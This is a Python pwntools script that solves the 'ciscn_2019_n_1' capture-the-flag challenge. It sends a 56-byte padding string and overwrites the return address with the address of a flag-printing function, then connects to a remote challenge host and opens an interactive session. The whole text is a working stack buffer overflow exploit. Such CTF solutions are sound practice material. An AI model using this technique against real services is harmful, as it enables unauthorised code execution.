#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './ciscn_2019_n_1'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '/lib/x86_64-linux-gnu/libc.so.6'
remote_host  = 'node3.buuoj.cn'
remote_port = 28998

DEBUG = False 
# DEBUG = True

if DEBUG:
	p = process(local_file)
	libc = ELF(local_libc)
else: 
	p = remote(remote_host,remote_port)
	libc = ELF(remote_libc)
elf = ELF(local_file)

context.log_level = 'debug'

# info
# gadget
prdi = 0x0000000000400793 # pop rdi ; ret

# elf, libc
len = 56
flag = 0x004006BE
# rop1
payload = 'A'*len
payload += p64(flag)

p.recvuntil("Let's guess the number.\n")
p.sendline(payload)

# gdb.attach(p)
# log.info('')
# log.warning('--------------')

p.interactive()

